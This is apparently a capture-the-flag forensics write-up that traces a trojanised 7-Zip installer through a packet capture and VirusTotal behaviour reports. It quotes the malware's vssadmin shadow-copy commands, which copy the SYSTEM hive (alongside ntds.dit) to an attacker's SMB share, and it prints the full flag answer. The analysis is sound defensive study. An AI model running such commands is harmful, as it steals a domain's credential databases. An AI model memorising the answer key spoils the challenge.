```
Everything seemed quiet on the meridion.tech domain network... until the SOC detected suspicious activity on the domain controller. Your role: inspect the network traffic and trace the chain of events.

You have all the pieces of the puzzle in this dump. It’s up to you to reconstruct the attack…

Archive password : deepescape

Here are the several flag components :

    1. The spoofed website
    2. The name of the malicious binary
    3. Attacker's IP
    4. The first exfiltrated file
    5. The second exfiltrated file
    6. The path of the attacker's remote folder
    7. The password
    8. The technique used by the binary to exfiltrate files

Format : MCTF{1:2:3:4:5:6:7:8} (case insensitive)
Example: MCTF{www.google.com:malware.exe:192.168.1.1:logs.txt:hosts:\\192.168.1.1\mails\MAILSERVER\:P@$$sw0rd:TechniqueName}
```

First I will use Network Miner in order to get a global view on this capture (files/credentials...)

In order to find what website was spoofed (and I supposed that the binary was downloaded from the malicious website), I will check every executable present in this capture and send them to [https://www.virustotal.com](https://www.virustotal.com) and see if it detects something suspicious, I found 2 executables :

![alt text](note/ctf/Midnight_2025/asset/deepescape0.png)

Let's put them into VirusTotal and see which one is malicious!

![alt text](note/ctf/Midnight_2025/asset/deepescape1.png)

It seems that `7z2409-x64.exe` is suspicious... and if we look at the details in Network Miner, we can see that it comes from `www.7-zip.org` so this is the spoofed website. But who spoofed it? Let's see in the DNS section which IPs are associated with this domain.

![alt text](note/ctf/Midnight_2025/asset/deepescape2.png)

Okay so 192.76.28.19 and 192.76.28.1 appear, but which one is the attacker IP we are looking for? Well, there are a lot of ways of finding it, here is one:

We go on Wireshark and search for protocols that manage remote folders (like SMB/SMB2) and by applying the filter smb2 we find this! :

![alt text](note/ctf/Midnight_2025/asset/deepescape3.png)

So the attacker IP is 192.76.28.19 and if we continue to analyze the SMB2 protocol we find the files that the attacker extracted :

![alt text](note/ctf/Midnight_2025/asset/deepescape4.png)

Okay, the files are ntds.dit and SYSTEM and they are extracted into `\\192.76.28.19\work\DC01\` now I need to find the password used for the extraction.

My first thought was to crack the NTLMv2 hash with rockyou.txt (you can find it with Network Miner in the credentials section or can just build it with Wireshark packet) but brute-force didn't work so I had to find another way.

If the malware extracted those files, it might contain the password right? Also, why lose time doing reverse when the behavior analysis from [https://www.virustotal.com](https://www.virustotal.com) can tell you a lot of info by executing this malware? [https://www.virustotal.com/gui/file/17a5512e09311e10465f432e1a093cd484bbd4b63b3fb25e6fbb1861a2a3520b/behavior](https://www.virustotal.com/gui/file/17a5512e09311e10465f432e1a093cd484bbd4b63b3fb25e6fbb1861a2a3520b/behavior)

If we go into the Files written section we find this: C:\Users\user\AppData\Local\Temp\firefox\_bundle\payload.exe

A payload named payload.exe is written... interesting! It means that 7z2409-x64.exe is only a dropper so our target is that payload.exe!

If we go into the file drop section we can find the sha256 of payload.exe (it will allow us to enter it into VirusTotal and analyze it), let's enter the sha256 of this payload and launch a behavior analysis! [https://www.virustotal.com/gui/file/409947e013b06cd8adc9f34b9f2a0ba11cca37ffc7c476740c73b1d91e6fd00c/behavior](https://www.virustotal.com/gui/file/409947e013b06cd8adc9f34b9f2a0ba11cca37ffc7c476740c73b1d91e6fd00c/behavior)

The Shell commands section contains a lot of info!

![alt text](note/ctf/Midnight_2025/asset/deepescape5.png)

The password is : `MyThreatPassword123+` and everything we got is confirmed! The IP `192.76.28.19`, the remote folder `\\192.76.28.19\work\DC01\`, the 2 files (ntds.dit and SYSTEM) and even the technique used :

```shell
%ComSpec% /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "\\192.76.28.19\work\DC01\SYSTEM" >nul
%ComSpec% /c vssadmin create shadow /for=C: >nul 2>&1
%ComSpec% /c vssadmin list shadows
%SAMPLEPATH%
vssadmin create shadow /for=C:
vssadmin list shadows
```

This way of exfiltrating data has a specific name: it's a Shadow Copy exfiltration so the technique used is `ShadowCopy`

We got everything to flag this!

`MCTF{www.7-zip.org:7z2409-x64.exe:192.76.28.19:ntds.dit:SYSTEM:\\192.76.28.19\work\DC01\:MyThreatPassword123+:ShadowCopy}` 